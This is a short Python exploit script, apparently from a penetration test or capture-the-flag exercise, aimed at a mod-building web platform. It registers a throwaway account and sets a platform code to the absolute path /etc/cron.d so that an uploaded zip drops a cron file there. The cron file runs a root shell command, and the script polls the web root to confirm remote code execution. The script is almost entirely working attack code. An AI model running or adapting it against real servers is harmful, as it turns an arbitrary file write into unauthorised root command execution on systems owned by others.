import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = pf.BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u

tok,u=fresh()
# Use absolute platform_code = /etc/cron.d (<=20 chars) -> storage_dir = /etc/cron.d
pid = pf.create_platform(tok, "/etc/cron.d", name="z")
mid = pf.create_mod(tok, "v%d"%random.randint(0,9999), title="z")
bid = pf.create_build(tok, mid, pid)
cron = "* * * * * root /bin/sh -c 'echo CRON_RCE_OK > /usr/share/nginx/html/cronmark.txt'\n"
r = pf.upload_zip(tok, mid, bid, {"zzcron": cron.encode()})
print("write /etc/cron.d ->", r.status_code, r.text[:80])
print("waiting 75s...")
for i in range(7):
    time.sleep(10)
    try:
        c = requests.get(f"{BASE}/cronmark.txt", timeout=8)
        print(f" t={i} status={c.status_code} body={c.text[:60]!r}")
        if c.status_code==200 and "doctype" not in c.text[:40].lower(): break
    except Exception as e:
        print(" t=",i,"err",e)
